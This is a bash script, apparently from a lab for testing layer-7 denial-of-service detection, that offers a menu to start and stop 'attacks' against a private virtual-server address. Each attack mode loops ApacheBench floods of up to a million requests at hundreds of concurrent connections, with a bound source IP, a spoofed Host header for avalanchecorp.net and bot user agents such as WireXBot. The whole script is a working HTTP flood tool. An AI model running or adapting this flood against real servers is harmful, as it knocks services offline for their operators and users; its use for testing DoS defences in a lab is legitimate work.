#!/bin/bash

VS_ADDR="10.1.10.138"
SRC_ADDR1="10.1.10.200"
SRC_ADDR2="10.1.10.200"
SRC_ADDR3="10.1.10.200"

# Add source IP address
sudo ip addr add 10.1.10.200/24 dev ens4:2

stop_flag=0

# trap ctrl-c and call ctrl_c()
trap ctrl_c INT

function ctrl_c() {
    echo "** Trapped CTRL-C"
    stop_flag=1
}
 
PS5='Please enter your choice: '
options=("Attack start - similarity" "Attack start - score"  "Attack end" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Attack start - similarity")
            echo "Start attack"
	    stop_flag=0
            while [ "$stop_flag" -eq 0 ]  
	    do    
		    ab -B ${SRC_ADDR1} -l -r -n 1000000 -c 200 -d -H "Host: avalanchecorp.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: eVil-sVen" -H "x-requested-with:" -H "Referer: http://10.0.2.1/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  http://${VS_ADDR}/ &
		    ab -B ${SRC_ADDR2} -l -r -n 1000000 -c 500 -d -H "Host: avalanchecorp.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)" -H "x-requested-with:" -H "Referer: http://10.0.2.1/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  http://${VS_ADDR}/ &
		    ab -B ${SRC_ADDR3} -l -r -n 1000000 -c 500 -d -s 10 -H "Host: avalanchecorp.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: WireXBot" -H "x-requested-with:" -H "Referer: http://10.0.2.1/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  http://${VS_ADDR}/

		    killall ab
	    done
            ;;
        "Attack start - score")
	echo "Start attack"
	    stop_flag=0
            while [ "$stop_flag" -eq 0 ]  
	    do    
		    ab -B ${SRC_ADDR1} -l -r -n 1000000 -c 500 -d -H "Host: avalanchecorp.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: WireXBot" -H "x-requested-with:" -H "Referer: http://10.0.2.1/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  http://${VS_ADDR}/ &
            ab -B ${SRC_ADDR2} -l -r -n 1000000 -c 500 -d -H "Host: avalanchecorp.net" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: WireXBot" -H "x-requested-with:" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  http://${VS_ADDR}/second.jpg &
		    ab -B ${SRC_ADDR3} -l -r -n 1000000 -c 500 -d -s 10 -H "Host: avalanchecorp.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: WireXBot" -H "x-requested-with:" -H "Referer: http://10.0.2.2/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  http://${VS_ADDR}/

		    killall ab
	    done
	
            ;;

        "Attack end")
            echo "Terminate attack"

        killall ab
            ;;

        "Quit")
            break
            ;;
        *) echo invalid option;;
    esac
done
